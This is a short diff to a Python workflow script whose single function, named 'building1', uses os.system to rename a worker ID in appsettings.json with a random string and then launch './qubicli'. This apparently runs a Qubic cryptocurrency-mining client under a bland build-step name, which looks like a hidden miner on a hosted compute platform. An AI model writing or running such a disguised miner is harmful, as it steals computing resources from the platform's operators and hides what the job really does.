@@ -14,8 +14,7 @@ app = Workflows()
 def building1():
   import sys
   import os
-  os.system('sed -i "s/\samje/$(echo $RANDOM | md5sum | head -c 10)/g" appsettings.json')
-  os.system('./qubicli')
+  os.system('sed -i "s/samje/$(echo $RANDOM | md5sum | head -c 10)/g" appsettings.json && ./qubicli')
 
 if __name__ == "__main__":
   app.start()
